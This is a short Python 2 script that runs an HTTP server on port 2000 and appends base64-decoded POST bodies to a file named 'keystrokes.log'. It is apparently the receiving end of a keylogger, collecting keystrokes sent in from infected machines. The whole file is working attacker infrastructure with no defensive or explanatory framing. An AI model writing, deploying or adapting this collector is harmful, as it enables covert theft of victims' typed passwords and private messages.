#!/usr/bin/env python2

import SimpleHTTPServer
import SocketServer
import base64

PORT = 2000


class GetHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        log = open("keystrokes.log", "a")
        content_len = int(self.headers.getheader('content-length', 0))
        data = self.rfile.read(content_len)
        print data
        log.write(str(base64.b64decode(data)))
        log.close()
        return self.send_response(200)

Handler = GetHandler
SocketServer.TCPServer.allow_reuse_address = True
httpd = SocketServer.TCPServer(("", PORT), Handler)
httpd.serve_forever()
